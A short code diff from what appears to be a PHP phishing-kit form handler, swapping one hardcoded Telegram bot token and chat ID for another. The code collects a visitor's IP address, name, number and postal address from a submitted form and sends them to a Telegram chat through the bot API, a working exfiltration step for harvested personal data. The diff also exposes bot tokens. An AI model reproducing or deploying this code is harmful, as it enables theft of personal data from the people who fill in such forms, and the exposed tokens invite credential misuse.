@@ -178,7 +178,7 @@ if(         isset($_POST['submit'])                 )
 	$adresse = $_POST["adresse"];
 
 
-	define ('url',"https://api.telegram.org/bot1865501764:AAE6Ep51dlBHRa8ZSk0csxOxrBc1IHJocTw/sendmessage?chat_id=1335982188&");
+	define ('url',"https://api.telegram.org/bot11989218162:AAFnXNFm8i4_xDlk3f6Av9QNQmCY-sgqvAc/sendmessage?chat_id=1217684250&");
 	$message = urlencode( "ip:"  .  $ip        .      "\n name : "  .   $name        .      "\n num : "  .   $num        .      "\n adresse : "  .   $adresse    );
 	file_get_contents(url."text=".$message."");
 
